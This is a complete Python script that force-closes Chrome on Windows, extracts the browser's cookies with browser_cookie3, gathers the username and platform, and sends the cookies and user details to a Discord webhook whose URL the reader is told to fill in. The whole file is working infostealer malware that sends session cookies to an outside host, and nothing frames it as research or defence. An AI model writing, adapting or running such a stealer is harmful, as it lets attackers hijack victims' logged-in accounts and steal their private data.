import os
import requests
import subprocess
import platform
from discord import Webhook
import browser_cookie3

# Your Discord webhook URL
webhook_url = 'YOUR_WEBHOOK_URL'  # Replace this with your actual webhook URL

# Function to send data to the Discord webhook
def send_to_discord(content):
    webhook = Webhook.from_url(webhook_url)
    try:
        webhook.send(content)
        print("Data sent to webhook")
    except Exception as e:
        print(f"Error sending webhook: {e}")

# Function to terminate Chrome (works on Windows, not on Android)
def terminate_chrome():
    if platform.system() == "Windows":
        try:
            subprocess.call("TASKKILL /f /IM CHROME.EXE")
        except Exception as e:
            print(f"Error terminating Chrome: {e}")
    else:
        print("Not running on Windows, so Chrome cannot be terminated.")

# Function to get cookies from Chrome
def get_chrome_cookies():
    try:
        cookies = browser_cookie3.chrome()
        if cookies:
            print("Cookies retrieved successfully.")
            return cookies
        else:
            print("No cookies found.")
            return None
    except Exception as e:
        print(f"Error getting cookies: {e}")
        return None

# Function to get user information (for example, you can get the username)
def get_user_info():
    user_info = {
        "username": os.getlogin(),
        "platform": platform.system(),
        "cookies": len(get_chrome_cookies()) if get_chrome_cookies() else 0
    }
    return user_info

# Main function
def main():
    print("Starting the process...")
    terminate_chrome()

    user_info = get_user_info()
    if user_info:
        print(f"User information retrieved successfully: {user_info}")
    else:
        print("No user information found.")

    cookies = get_chrome_cookies()
    if cookies:
        send_to_discord(f"Cookies retrieved: {cookies}")
    else:
        send_to_discord("No valid cookies found.")

    # Send user data to the webhook
    send_to_discord(f"User info: {user_info}")

if __name__ == "__main__":
    main()
    
